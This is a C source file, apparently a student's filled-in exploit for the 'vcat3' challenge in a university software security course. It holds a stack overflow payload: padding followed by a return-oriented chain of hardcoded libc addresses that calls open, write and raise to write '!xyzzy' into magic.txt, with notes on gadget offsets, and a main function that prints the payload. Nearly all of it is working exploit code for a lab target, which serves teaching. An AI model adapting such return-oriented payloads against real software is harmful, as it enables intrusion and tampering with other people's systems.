/*
 * CTF-2 `vcat3' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <stdlib.h>
#include <unistd.h>

unsigned char payload[] =
	/* ------------------------------------	*/
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXX"
	/* ------------------------------------	*/
	/* BELOW IS THE FIRST RETURN ADDRESS OVERWRITTEN */
	/* ------------------------------------	*/
	"\xF0\x5A\xF4\xB5"	// Open Address
	"\xEE\x54\xFC\xB5"	// 3 Pops, then ret
	"\xA0\xB6\xFF\xBF"	// Pointer to String
	"\x01\x00\x00\x00"	// Flags
	"\x00\x00\x00\x00"	// 0 (For read)

	"\x10\x60\xF4\xB5"	// Write Address
	"\xEE\x54\xFC\xB5"	// 3 Pops, then ret
	"\x03\x00\x00\x00"	// File descriptor (3)
	"\xAC\xB6\xFF\xBF"	// Pointer to String
	"\x06\x00\x00\x00"	// 6 (The num of chars to write)

	"\x40\x8D\xE8\xB5"	// Raise Address (return address of System)
	"\xDE\xAD\xBE\xEF"	// Stuff (hi I'm stuff)
	"\x0C\x00\x00\x00"	// Raise's Argument

	// First string (magic.txt)
	"\x6D\x61\x67\x69"
	"\x63\x2E\x74\x78"
	"\x74\x00\x00\x00"

	// Second string (!xyzzy)
	"\x21\x78\x79\x7A"
	"\x7A\x79\x00\x00"
	

	/* USEFUL NOTES */
	// 0xb5e710f0 is start address of libc text segment
	// 16d4ee into libc we have 3 pops, followed by ret
	// 0xb5fc54ee is the address of 3 pops, followed by ret
;

int
main(int argc, char **argv)
{
	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success		*/
	return EXIT_SUCCESS;
}
